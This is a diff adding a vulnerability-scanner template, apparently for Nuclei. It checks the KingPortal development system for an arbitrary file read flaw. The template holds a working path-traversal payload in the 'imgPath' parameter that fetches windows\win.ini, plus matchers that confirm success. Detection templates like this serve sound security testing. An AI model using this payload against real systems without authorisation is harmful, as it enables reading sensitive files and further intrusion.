@@ -1,0 +1,28 @@
+id: poc-yaml-kingportal-img-anyfile-read
+info:
+  name: 北京亚控科技KingPortal开发系统 img 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    KingPortal开发系统存在任意文件读取漏洞，通过构造特定的请求可以读取系统中的任意文件。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/kingclient/img?imgPath=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[files]"
+          - "bit app support"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
